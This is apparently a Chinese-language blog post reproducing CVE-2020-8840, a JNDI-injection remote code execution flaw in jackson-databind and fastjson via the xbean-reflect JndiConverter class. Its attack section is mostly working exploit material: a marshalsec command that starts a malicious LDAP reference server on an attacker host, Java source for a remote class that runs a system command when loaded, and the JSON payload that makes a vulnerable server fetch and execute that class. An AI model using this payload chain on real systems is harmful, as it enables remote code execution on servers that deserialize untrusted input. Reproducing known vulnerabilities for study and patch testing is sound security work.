---
layout:     post
title:      "JndiConverter反序列化利用链fastjson复现（CVE-2020-8840）"
subtitle:   ""
date:       2020-09-09 12:00:00
author:     "seal"
header-img: "img/post-bg-infinity.jpg"
tags:
    - 反序列化
    - 漏洞复现
typora-root-url: ../../luckseal.github.io
---

# 漏洞介绍

2月19日，NVD发布安全通告披露了jackson-databind由JNDI注入导致的远程代码执行漏洞（CVE-2020-8840），CVSS评分为9.8  。受影响版本的jackson-databind中由于缺少某些xbean-reflect/JNDI黑名单类，如org.apache.xbean.propertyeditor.JndiConverter，可导致攻击者使用JNDI注入的方式实现远程代码执行。



# 漏洞前提

1、使用了xbean-reflect jar 包

2、使用了反序列化库，并反序列化参数用户可控（已知影响fastjson以及jackson）

3、被攻击机可向外访问攻击机主机



# 攻击方法

## 以fastjson为例：

### 1、攻击者开启rmi或ldap

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.132.1/#Exploit" 9999
```



### 2、攻击者部署恶意攻击类

地址：`http://192.168.132.1/Exploit.class`

源码：
```
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            // do nothing
        }
    }
}
```



### 3、发送攻击payload
```
{
    "xxx":{
        "@type":"org.apache.xbean.propertyeditor.JndiConverter",
        "asText":"ldap://192.168.132.1:9999/Exploit",
    }
}
```

